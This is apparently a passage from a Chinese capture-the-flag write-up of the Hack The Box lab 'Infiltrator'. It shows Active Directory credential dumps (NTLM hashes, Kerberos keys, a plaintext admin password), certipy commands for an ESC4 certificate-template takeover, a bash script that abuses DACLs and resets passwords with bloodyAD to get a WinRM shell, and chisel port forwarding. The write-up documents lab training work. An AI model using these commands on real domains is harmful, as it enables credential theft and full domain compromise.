+<span class="line"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
+<span class="line"><span>DC$:1001:aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00:::</span></span>
+<span class="line"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:454fcbc37690c6e4628ab649e8e285a5:::</span></span>
+<span class="line"><span>infiltrator.htb\winrm_svc:1104:aad3b435b51404eeaad3b435b51404ee:84287cd16341b91eb93a58456b73e30f:::</span></span>
+<span class="line"><span>infiltrator.htb\lan_managment:1105:aad3b435b51404eeaad3b435b51404ee:e8ade553d9b0cb1769f429d897c92931:::</span></span>
+<span class="line"><span>infiltrator.htb\M.harris:1106:aad3b435b51404eeaad3b435b51404ee:fc236589c448c620417b15597a3d3ca7:::</span></span>
+<span class="line"><span>infiltrator.htb\D.anderson:1107:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::</span></span>
+<span class="line"><span>infiltrator.htb\L.clark:1108:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::</span></span>
+<span class="line"><span>infiltrator.htb\O.martinez:1109:aad3b435b51404eeaad3b435b51404ee:eb86d7bcb30c8eac1bdcae5061e2dff4:::</span></span>
+<span class="line"><span>infiltrator.htb\A.walker:1110:aad3b435b51404eeaad3b435b51404ee:46389d8dfdfcf0cbe262a71f576e574b:::</span></span>
+<span class="line"><span>infiltrator.htb\K.turner:1111:aad3b435b51404eeaad3b435b51404ee:48bcd1cdc870c6285376a990c2604531:::</span></span>
+<span class="line"><span>infiltrator.htb\E.rodriguez:1112:aad3b435b51404eeaad3b435b51404ee:b1918c2ce6a62f4eee11c51b6e2e965a:::</span></span>
+<span class="line"><span>[*] Kerberos keys from res/Active Directory/ntds.dit </span></span>
+<span class="line"><span>DC$:aes256-cts-hmac-sha1-96:09b3e08f549e92e0b16ed45f84b25cc6d0c147ff169ce059811a3ed9e6957176</span></span>
+<span class="line"><span>DC$:aes128-cts-hmac-sha1-96:d2a3d7c9ee6965b1e3cd710ed1ceed0f</span></span>
+<span class="line"><span>DC$:des-cbc-md5:5eea34b3317aea91</span></span>
+<span class="line"><span>krbtgt:aes256-cts-hmac-sha1-96:f6e0a1bd3a180f83472cd2666b28de969442b7745545afb84bbeaa9397cb9b87</span></span>
+<span class="line"><span>krbtgt:aes128-cts-hmac-sha1-96:7874dff8138091d6c344381c9c758540</span></span>
+<span class="line"><span>krbtgt:des-cbc-md5:10bfc49ecd3b58d9</span></span>
+<span class="line"><span>infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:ae473ae7da59719ebeec93c93704636abb7ee7ff69678fdec129afe2fc1592c4</span></span>
+<span class="line"><span>infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:0faf5e0205d6f43ae37020f79f60606a</span></span>
+<span class="line"><span>infiltrator.htb\winrm_svc:des-cbc-md5:7aba231386c2ecf8</span></span>
+<span class="line"><span>infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:6fcd2f66179b6b852bb3cc30f2ba353327924081c47d09bc5a9fafc623016e96</span></span>
+<span class="line"><span>infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:48f45b8eb2cbd8dbf578241ee369ddd9</span></span>
+<span class="line"><span>infiltrator.htb\lan_managment:des-cbc-md5:31c83197ab944052</span></span>
+<span class="line"><span>infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:20433af8bf6734568f112129c951ad87f750dddf092648c80816d5cb42ed0f49</span></span>
+<span class="line"><span>infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:2ee0cd05c3fa205a92e6837ff212b7a0</span></span>
+<span class="line"><span>infiltrator.htb\M.harris:des-cbc-md5:3ee3688376f2e5ce</span></span>
+<span class="line"><span>infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f</span></span>
+<span class="line"><span>infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69</span></span>
+<span class="line"><span>infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345</span></span>
+<span class="line"><span>infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc</span></span>
+<span class="line"><span>infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983</span></span>
+<span class="line"><span>infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd</span></span>
+<span class="line"><span>infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:4d2d8951c7d6eba4edaf172fd0f7b78ab7260e3d513bf2ff387c70c85d912a2f</span></span>
+<span class="line"><span>infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:33fdf738e13878a8101e3bf929a5a120</span></span>
+<span class="line"><span>infiltrator.htb\O.martinez:des-cbc-md5:f80bc202755d2cfd</span></span>
+<span class="line"><span>infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:e26c97600c6f44990f18480087a685e0f1c71bcfbc8413dce6764ccf77df448a</span></span>
+<span class="line"><span>infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:768672b783131ed963b9deeac0a6d2e4</span></span>
+<span class="line"><span>infiltrator.htb\A.walker:des-cbc-md5:a7e6cde06d6e153b</span></span>
+<span class="line"><span>infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:2c816a32b395f67df520bc734f7ea8e4df64a9610ffb3ef43e0e9df69b9df8b8</span></span>
+<span class="line"><span>infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:b20f41c0d3b8fb6e1b793af4a835109b</span></span>
+<span class="line"><span>infiltrator.htb\K.turner:des-cbc-md5:4607b9eaec6838ba</span></span>
+<span class="line"><span>infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:9114030dd2a57970530eda4ce0aa6b14f88f2be44f6d920de31eb6ee6f1587b5</span></span>
+<span class="line"><span>infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:ddd37cf706781414885f561c3b469d0c</span></span>
+<span class="line"><span>infiltrator.htb\E.rodriguez:des-cbc-md5:9d5bdaf2cd26165d</span></span>
+<span class="line"><span>[*] Cleaning up... </span></span></code></pre>
+<p>注意到这里 O.martinez 用户的 NTLM 和之前拿到的不一样，而且尝试了几个用户发现都登录失败</p>
+<p><img alt="image-20241121105605376.png" loading="lazy" decoding="async" width="1178" height="706" src="/_astro/image-20241121105605376.udbRXBac_Z24XeMb.webp" srcset=""></p>
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/stealing-credentials">https://book.hacktricks.xyz/windows-hardening/stealing-credentials</a>
+<a href="https://github.com/almandin/ntdsdotsqlite">https://github.com/almandin/ntdsdotsqlite</a></p>
+</blockquote>
+<p>可以尝试从 NTDS.dit 中提取域对象到 SQLite 数据库</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ntdsdotsqlite --system SYSTEM -o ntds.db ntds.dit</span></span>
+<span class="line"><span>sqlitebrowser ntds.db</span></span></code></pre>
+<p><img alt="image-20241121110153097.png" loading="lazy" decoding="async" width="1280" height="494" src="/_astro/image-20241121110153097.ByYF_TZ4_ZjPhdk.webp" srcset=""></p>
+<p>这里发现了 lan_managment 用户的注释 <code>l@n_M@an!1331</code> 密码喷射</p>
+<p><img alt="image-20241121110754440.png" loading="lazy" decoding="async" width="1490" height="413" src="/_astro/image-20241121110754440.DiK3vjxW_Z1OQQnm.webp" srcset=""></p>
+<p><img alt="image-20241121111356806.png" loading="lazy" decoding="async" width="955" height="262" src="/_astro/image-20241121111356806.DbjUnssw_NwO7D.webp" srcset=""></p>
+<p>Bloodhound 发现 lan_managment 有 GMSA 权限</p>
+<p><img alt="image-20241121112626750.png" loading="lazy" decoding="async" width="905" height="618" src="/_astro/image-20241121112626750.BpUmuV-S_slrqH.webp" srcset=""></p>
+<p>但是这个用户没有远程权限，那么可以通过 runas 或者 ldap 来实现</p>
+<p><img alt="image-20241121113417879.png" loading="lazy" decoding="async" width="1509" height="175" src="/_astro/image-20241121113417879.CuCrsEf5_Zk3PDW.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Account: infiltrator_svc$</span></span>
+<span class="line"><span>NTLM: c344426816ad3708039ba56fdb7d08fb</span></span></code></pre>
+<p><img alt="image-20241121122649185.png" loading="lazy" decoding="async" width="1138" height="306" src="/_astro/image-20241121122649185.DDeAX9iN_DAICB.webp" srcset=""></p>
+<p>这个用户并没有什么远程权限，那么枚举一下 AD CS</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>certipy-ad find -u 'infiltrator_svc$@infiltrator.htb' -hashes 'c344426816ad3708039ba56fdb7d08fb' -vulnerable -stdout</span></span></code></pre>
+<p><img alt="image-20241121125007911.png" loading="lazy" decoding="async" width="1286" height="1092" src="/_astro/image-20241121125007911.FkGYB4Ue_1R4bHl.webp" srcset=""></p>
+<p>ESC4 是指用户对证书模板具有写权限。可以覆盖证书模板的配置，使模板受到 ESC1 的攻击。</p>
+<blockquote>
+<p><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4">https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4</a></p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>certipy template -u 'infiltrator_svc$@infiltrator.htb' -hashes 'c344426816ad3708039ba56fdb7d08fb' -template Infiltrator_Template -dc-ip 10.10.11.31</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>certipy req -u 'infiltrator_svc$@infiltrator.htb' -hashes 'c344426816ad3708039ba56fdb7d08fb' -ca infiltrator-DC01-CA -template Infiltrator_Template -upn administrator@infiltrator.htb -dc-ip 10.10.11.31</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.31</span></span></code></pre>
+<p><img alt="image-20241121125900476.png" loading="lazy" decoding="async" width="1633" height="683" src="/_astro/image-20241121125900476.DGgJXCQL_TK5d7.webp" srcset=""></p>
+<p>get flag</p>
+<p><img alt="image-20241121130147559.png" loading="lazy" decoding="async" width="1629" height="332" src="/_astro/image-20241121130147559.4oRfpb_A_ZTjPHG.webp" srcset=""></p>
+<h2 id="more">More</h2>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-secretsdump Administrator@10.10.11.31 -hashes ':1356f502d2764368302ff0369b1121a1'</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Service RemoteRegistry is in stopped state</span></span>
+<span class="line"><span>[*] Starting service RemoteRegistry</span></span>
+<span class="line"><span>[*] Target system bootKey: 0xb69149edc42a85733e4efe5e35a33e87</span></span>
+<span class="line"><span>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:4dc8e10f3a29237b05bdfdb5bded5451:::</span></span>
+<span class="line"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
+<span class="line"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
+<span class="line"><span>[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.</span></span>
+<span class="line"><span>[*] Dumping cached domain logon information (domain/username:hash)</span></span>
+<span class="line"><span>[*] Dumping LSA Secrets</span></span>
+<span class="line"><span>[*] $MACHINE.ACC</span></span>
+<span class="line"><span>INFILTRATOR\DC01$:aes256-cts-hmac-sha1-96:15db1652b02a83f4324bd8ba4f2a20eb8ea7631bf87dfec2d4f97ebeff32435d</span></span>
+<span class="line"><span>INFILTRATOR\DC01$:aes128-cts-hmac-sha1-96:70d8ad0059f5e81f43310c34e9937556</span></span>
+<span class="line"><span>INFILTRATOR\DC01$:des-cbc-md5:80fe9dbfa22531ab</span></span>
+<span class="line"><span>INFILTRATOR\DC01$:plain_password_hex:0a3183391dac772712b98e94fead3b9456bfedcc57c953d18084f50e94cf42d6c08434a1d3217c2fe151916a0ae7867c415ab8d3546f4ecc4707410ca56e2556aef2298066f7842ec1ad4819706032c10db5d22ff762c9a4fdeb82405627c04ed0ae8ee0514170acb1f0fa8964a2d045ba16b749ef89933bccd53b25a8aa0f5d17c2d519f9aa7a939b1fb9701bb88a1abb5efdfbcd02226e09032d8ffced8801e6cf8adf16bceb1491482d23a8281326cc82a6fa06425336d1422cd3b1cadd389263a9f557ce5221a86b28a71dc6276a0ac8165b7c5c5929dd3998130bbd7b9e41b9a8e4d69e1b7a614f25b6a8aa672b</span></span>
+<span class="line"><span>INFILTRATOR\DC01$:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::</span></span>
+<span class="line"><span>[*] DefaultPassword</span></span>
+<span class="line"><span>INFILTRATOR\Administrator:Infiltrator_Box1337!</span></span>
+<span class="line"><span>[*] DPAPI_SYSTEM</span></span>
+<span class="line"><span>dpapi_machinekey:0xbd8a15f7e24918ac40db6b340498aeda032c4fc0</span></span>
+<span class="line"><span>dpapi_userkey:0xf0f81997f3c057103ab87ac71dc986c455880e83</span></span>
+<span class="line"><span>[*] NL$KM</span></span>
+<span class="line"><span> 0000   A9 F8 C1 38 F1 FB 53 1A  E1 12 CA 8A 61 D3 C1 D6   ...8..S.....a...</span></span>
+<span class="line"><span> 0010   67 09 77 BC BC C6 BC 2F  5D E3 18 3D 66 DB 6D 9F   g.w..../]..=f.m.</span></span>
+<span class="line"><span> 0020   03 30 80 2D 25 9F 69 56  39 55 EA A3 50 D0 CA 0F   .0.-%.iV9U..P...</span></span>
+<span class="line"><span> 0030   C6 18 45 14 9E 8E B6 3C  46 49 6F 3B FA EF FE 89   ..E....&lt;FIo;....</span></span>
+<span class="line"><span>NL$KM:a9f8c138f1fb531ae112ca8a61d3c1d6670977bcbcc6bc2f5de3183d66db6d9f0330802d259f69563955eaa350d0ca0fc61845149e8eb63c46496f3bfaeffe89</span></span>
+<span class="line"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span>
+<span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1:::</span></span>
+<span class="line"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
+<span class="line"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d400d2ccb162e93b66e8025118a55104:::</span></span>
+<span class="line"><span>infiltrator.htb\D.anderson:1103:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::</span></span>
+<span class="line"><span>infiltrator.htb\L.clark:1104:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::</span></span>
+<span class="line"><span>infiltrator.htb\M.harris:1105:aad3b435b51404eeaad3b435b51404ee:3ed8cf1bd9504320b50b2191e8fb7069:::</span></span>
+<span class="line"><span>infiltrator.htb\O.martinez:1106:aad3b435b51404eeaad3b435b51404ee:daf40bbfbf00619b01402e5f3acd40a9:::</span></span>
+<span class="line"><span>infiltrator.htb\A.walker:1107:aad3b435b51404eeaad3b435b51404ee:f349468bb2c669ec8c3fd4154fdfe126:::</span></span>
+<span class="line"><span>infiltrator.htb\K.turner:1108:aad3b435b51404eeaad3b435b51404ee:a119c0d5af383e9591ebb67857e2b658:::</span></span>
+<span class="line"><span>infiltrator.htb\E.rodriguez:1109:aad3b435b51404eeaad3b435b51404ee:b02e97f2fdb5c3d36f77375383449e56:::</span></span>
+<span class="line"><span>infiltrator.htb\winrm_svc:1601:aad3b435b51404eeaad3b435b51404ee:120c6c7a0acb0cd808e4b601a4f41fd4:::</span></span>
+<span class="line"><span>infiltrator.htb\lan_managment:8101:aad3b435b51404eeaad3b435b51404ee:a1983d156e1d0fdf9b01208e2b46670d:::</span></span>
+<span class="line"><span>DC01$:1000:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::</span></span>
+<span class="line"><span>infiltrator_svc$:3102:aad3b435b51404eeaad3b435b51404ee:c344426816ad3708039ba56fdb7d08fb:::</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<h3 id="mharris-shell-立足点">M.Harris Shell 立足点</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#!/bin/bash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>sudo timedatectl set-ntp no</span></span>
+<span class="line"><span>sudo rdate -n 10.10.11.31</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>impacket-getTGT 'infiltrator.htb'/'D.Anderson':'WAT?watismypass!'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>KRB5CCNAME=D.Anderson.ccache /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'D.Anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb'/'D.Anderson':'WAT?watismypass!' -dc-ip dc01.infiltrator.htb -k -no-pass</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>bloodyAD --host "dc01.infiltrator.htb" -d 'infiltrator.htb' -u 'D.Anderson' -p 'WAT?watismypass!' -k --dc-ip '10.10.11.31' set password 'E.Rodriguez' 'Admin@123'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>bloodyAD --host "dc01.infiltrator.htb" -d 'infiltrator.htb' -u 'E.Rodriguez' -p 'Admin@123' -k --dc-ip '10.10.11.31' add groupMember 'Chiefs Marketing' 'E.Rodriguez'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>bloodyAD --host "dc01.infiltrator.htb" -d 'infiltrator.htb' -u 'E.Rodriguez' -p 'Admin@123' -k --dc-ip '10.10.11.31' set password 'M.Harris' 'Admin@123'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>impacket-getTGT 'infiltrator.htb'/'M.Harris':'Admin@123'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo "[+] Login Shell: KRB5CCNAME=M.Harris.ccache evil-winrm -i 'dc01.infiltrator.htb' -u 'M.Harris' -p 'Admin@123' -r 'infiltrator.htb'"</span></span></code></pre>
+<h3 id="port-forwarding">Port forwarding</h3>
+<ul>
+<li>Chisel Server</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>chisel server --reverse</span></span></code></pre>
+<ul>
+<li>Chisel Client</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>chisel.exe client -v [chisel_server_ip]:[chisel_port] R:0.0.0.0:14406:127.0.0.1:14406 R:0.0.0.0:14118:127.0.0.1:14118 R:0.0.0.0:14121:127.0.0.1:14121 R:0.0.0.0:14122:127.0.0.1:14122 R:0.0.0.0:14123:127.0.0.1:14123 R:0.0.0.0:14125:127.0.0.1:14125 R:0.0.0.0:14126:127.0.0.1:14126 R:0.0.0.0:14127:127.0.0.1:14127 R:0.0.0.0:14128:127.0.0.1:14128 R:0.0.0.0:14130:127.0.0.1:14130 </span></span></code></pre>
+</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=null;function n(){let n=document.querySelector(`[data-article-content]`),r=document.querySelector(`[data-toc]`),i=document.querySelector(`[data-toc-nav]`);if(!n||!r||!i)return;t?.disconnect(),t=null,i.replaceChildren();let a=Array.from(n.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(a.length===0){r.hidden=!0;return}r.hidden=!1;let o=new Set,s=[];for(let t of a){let n=t.id;if(!n){let r=e(t.textContent??``);n=r;let i=2;for(;o.has(n)||document.getElementById(n);)n=`${r}-${i}`,i+=1;t.id=n}o.add(n);let r=document.createElement(`a`);r.href=`#${n}`,r.textContent=(t.textContent??``).trim(),r.className=t.tagName===`H3`?`toc-h3`:`toc-h2`,r.dataset.target=n,i.appendChild(r),s.push(r)}let c=e=>{for(let t of s)t.classList.toggle(`active`,t.dataset.target===e)};t=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&c(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of a)t.observe(e);location.hash?c(decodeURIComponent(location.hash.slice(1))):a[0]&&c(a[0].id)}n(),document.addEventListener(`article-content-unlocked`,()=>{n()});</script></body></html>
